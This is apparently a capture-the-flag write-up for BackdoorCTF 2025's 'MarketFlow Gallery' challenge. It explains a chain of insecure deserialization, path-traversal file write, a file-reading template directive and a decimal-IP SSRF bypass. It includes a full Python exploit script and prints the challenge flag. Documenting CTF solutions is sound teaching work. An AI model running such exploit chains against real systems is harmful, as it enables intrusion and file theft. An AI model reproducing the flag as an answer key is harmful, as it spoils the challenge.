## BackdoorCTF 2025 - MarketFlow Gallery Write-up

![Challenge Info](images/Title.png)

### Step 1: Reconnaissance & Vulnerability Analysis

The challenge provided the source code for a Flask-based marketing platform. After analyzing the application logic, I identified a complex chain involving Insecure Deserialization, Path Traversal, Template Injection, and SSRF to achieve Arbitrary File Read.

#### Vulnerability 1: Insecure Deserialization (ObjectManager)

The core of the application used a custom `ObjectManager` to handle data processing. I noticed that the `deserialize` method blindly instantiates any class listed in the `CLASS_REGISTRY` based on a `_type` JSON field.

**File:** `services/object_manager.py`
```python
def deserialize(self, data):
    # ...
    obj_type = data.get('_type')
    klass = self.registry[obj_type]
    # ...
    instance = klass(**constructor_data)
```

Checking the `CLASS_REGISTRY`, I found several interesting classes, specifically `PersistenceAdapter` and `CacheConfiguration`.

#### Vulnerability 2: Arbitrary File Write (Gadget Chain)

The `PersistenceAdapter` class was intended for caching but lacked path validation. It allows writing data to a file specified by `storage_path`.

**File:** `services/cache_service.py`
```python
class PersistenceAdapter:
    # ...
    def write(self, data):
        # VULNERABILITY: No sanitization of storage_path allows Directory Traversal
        full_path = os.path.join('/var/tmp/sessionmaze/cache', self.storage_path)
        # ...
        with open(full_path, write_mode) as f:
            # Writes data to the file
```

By nesting a `PersistenceAdapter` inside a `CacheConfiguration` (which runs during report generation), I realized I could use `../` to break out of the cache directory and write a file anywhere the application had permissions—specifically, the `templates` directory.

#### Vulnerability 3: Template Injection (Legacy Mode)

The `TemplateRenderer` supports a "legacy" mode. If a template file starts with a specific header, it enables special directives, including one that reads local files.

**File:** `services/renderer.py`
```python
def _render_legacy_template(self, template_path, spec):
    # ...
    if not lines or not lines[0].strip().startswith('# -*- mode: legacy -*-'):
        return self._render_safe_template(template_path, spec)
    
    # ...
    if line.strip().startswith('@config:'):
        # VULNERABILITY: Reads arbitrary file content into the output
        config_path = line.strip()[8:].strip()
        with open(config_path, 'r') as cf:
             content = cf.read()
```

This gave me the plan: Write a malicious template containing `@config:/flag.txt` using the deserialization gadget, then render it to read the flag.

#### Vulnerability 4: SSRF & Cron Trigger

The malicious file write only occurs when a scheduled task is processed. Tasks are processed by the `/internal/cron/process` endpoint, which is restricted to `localhost`.

**File:** `app.py`
```python
@app.route('/internal/cron/process', methods=['POST'])
def process_scheduled_tasks():
    if request.remote_addr not in ['127.0.0.1', 'localhost']:
        return jsonify({"error": "Internal only"}), 403
    # ...
```

The application exposes a webhook forwarder at `/api/webhooks/forward`. While it uses `is_safe_url` to block standard local addresses (like `127.0.0.1` or `localhost`), the Regex failed to account for **Decimal IP representations**.

I could bypass the check using `2130706433` (which is the decimal integer for `127.0.0.1`) to force the server to trigger its own cron job.

### Step 2: The Exploit

I wrote a Python script to automate the attack chain:
1.  **Register/Login:** Obtain a valid session.
2.  **Schedule Malicious Report:** Send a payload instantiating a `ReportConfiguration` -> `AnalyticsProcessor` -> `CacheConfiguration` -> `PersistenceAdapter`. This queues a task that, when executed, writes a malicious template (`# -*- mode: legacy -*-\n@config:/flag.txt`) to `../templates/exploit.tpl`.
3.  **Trigger Cron via SSRF:** Use the `WebhookForwarder` to POST to `http://2130706433:5000/internal/cron/process`.
4.  **Retrieve Flag:** Fetch the generated report which now contains the flag.

**Final Exploit Code (`solve.py`):**

```python
import requests
import random
import string
import re
import sys
import time

BASE_URL = "http://34.10.220.48:6002"
INTERNAL_CRON_URL = "http://2130706433:5000/internal/cron/process"

def random_str(k=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=k))

def exploit():
    s = requests.Session()
    
    print(f"[+] Target: {BASE_URL}")
    
    username = random_str()
    password = random_str()
    email = f"{username}@marketflow.local"
    
    print(f"[*] Registering user: {username}")
    r = s.post(f"{BASE_URL}/api/auth/register", json={
        "username": username,
        "password": password,
        "email": email
    })
    if r.status_code != 201:
        print(f"[-] Registration failed: {r.text}")
        sys.exit(1)
        
    print(f"[*] Logging in...")
    r = s.post(f"{BASE_URL}/api/auth/login", json={
        "username": username,
        "password": password
    })
    if r.status_code != 200:
        print(f"[-] Login failed: {r.text}")
        sys.exit(1)
    
    print("[+] Authentication successful")
    
    tpl_name = f"exploit_{random_str()}.tpl"
    malicious_template = "# -*- mode: legacy -*-\n@config:/flag.txt"
    
    print(f"[*] Scheduling malicious report using template: {tpl_name}")
    
    payload = {
        "_type": "ReportConfiguration",
        "report_type": "security_audit",
        "date_range": "today",
        "processor": {
            "_type": "AnalyticsProcessor",
            "data_source": "internal",
            "output_config": {
                "_type": "CacheConfiguration",
                "cache_key": f"cache_{random_str()}",
                "objects": [malicious_template],
                "persistence": {
                    "_type": "PersistenceAdapter",
                    "storage_path": f"../templates/{tpl_name}",
                    "mode": "w"
                }
            }
        },
        "template": {
            "_type": "TemplateSpecification",
            "template_name": tpl_name
        }
    }
    
    r = s.post(f"{BASE_URL}/api/analytics/reports", json=payload)
    if r.status_code != 200:
        print(f"[-] Failed to schedule report: {r.text}")
        sys.exit(1)
        
    report_data = r.json()
    report_url = report_data.get('report_url')
    print(f"[+] Report scheduled. URL: {report_url}")
    
    print(f"[*] Triggering internal cron via SSRF...")
    
    webhook_payload = {
        "_type": "WebhookForwarder",
        "target_url": INTERNAL_CRON_URL,
        "method": "POST"
    }
    
    r = s.post(f"{BASE_URL}/api/webhooks/forward", json=webhook_payload)
    print(f"[*] SSRF Response: {r.text}")
    
    print(f"[*] Fetching report to retrieve flag...")
    time.sleep(1)
    
    r = s.get(f"{BASE_URL}{report_url}")
    
    if r.status_code == 200:
        content = r.text
        if "flag{" in content:
            flag = re.search(r"flag\{.*?\}", content).group(0)
            print(f"\n[+] SUCCESS! Flag found: {flag}\n")
        else:
            print("[-] Report fetched but flag not found in content.")
            print(content[:500])
    else:
        print(f"[-] Failed to fetch report. Status: {r.status_code}")

if __name__ == "__main__":
    exploit()
```

### Step 3: Result

The script successfully bypassed the restrictions, wrote the template, triggered the cron job, and retrieved the flag from the report.

![Exploit Output](images/1.png)

### Flag
Flag: `flag{n3st3d_d3s3r1al1z4t10n_ssrf_ch41n_c0mpl3t3_0b53wrf}`